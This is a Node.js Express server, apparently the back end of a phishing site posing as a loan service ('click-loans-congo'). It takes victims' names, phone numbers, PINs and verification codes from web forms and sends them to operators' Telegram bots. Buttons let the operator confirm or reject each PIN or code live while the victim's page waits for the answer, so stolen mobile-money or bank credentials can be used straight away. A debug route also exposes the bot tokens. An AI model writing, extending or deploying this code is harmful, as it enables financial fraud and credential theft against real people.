require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_URL || 'https://click-loans-congo-x50d.onrender.com';

// ---------------- MEMORY STORES ----------------
const approvedPins = {};
const approvedCodes = {};
const blockPins = {};
const requestBotMap = {};

// ---------------- MULTI-BOT STORE ----------------
let bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
console.log('✅ Bots chargés:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('Erreur Telegram:', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId
        });
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}

// ---------------- WEBHOOKS ----------------
async function setWebhook(bot) {
    try {
        const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
        console.log(`✅ Webhook configuré pour ${bot.botId}`);
    } catch (err) {
        console.error(`❌ Échec du webhook pour ${bot.botId}:`, err.response?.data || err.message);
    }
}

// Set webhook for all bots at startup
async function setAllWebhooks() {
    for (const bot of bots) await setWebhook(bot);
}

// ---------------- PAGES ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Lien bot invalide');
    res.redirect(`/index.html?botId=${bot.botId}`);
});
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- PIN SUBMISSION ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Bot invalide' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(bot, `🔐 VÉRIFICATION DU CODE PIN\n\nNom: ${name}\nTéléphone: ${phone}\nPIN: ${pin}`, [[
        { text: '✅ PIN correct', callback_data: `pin_ok:${requestId}` },
        { text: '❌ PIN incorrect', callback_data: `pin_bad:${requestId}` },
        { text: '🛑 Bloquer', callback_data: `pin_block:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'Utilisateur bloqué' });
    res.json({ approved: approvedPins[requestId] ?? null });
});

// ---------------- CODE SUBMISSION ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Bot invalide' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(bot, `🔑 VÉRIFICATION DU CODE\n\nNom: ${name}\nTéléphone: ${phone}\nCode: ${code}`, [[
        { text: '✅ Code correct', callback_data: `code_ok:${requestId}` },
        { text: '❌ Code incorrect', callback_data: `code_bad:${requestId}` },
        { text: '✅ Code OK + ❌ PIN incorrect', callback_data: `code_pin:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    let feedback = '';

    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approuvé ✅'; }
    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejeté ❌'; }
    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'Utilisateur bloqué 🛑'; }
    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approuvé ✅'; }
    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejeté ❌'; }
    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approuvé – ressaisir le PIN'; }

    if (feedback) await sendTelegramMessage(bot, `📝 Retour:\n${feedback}`);
    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- DEBUG ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

// ---------------- START SERVER ----------------
setAllWebhooks().then(() => {
    app.listen(PORT, () => console.log(`🚀 Serveur démarré sur le port ${PORT}`));
});
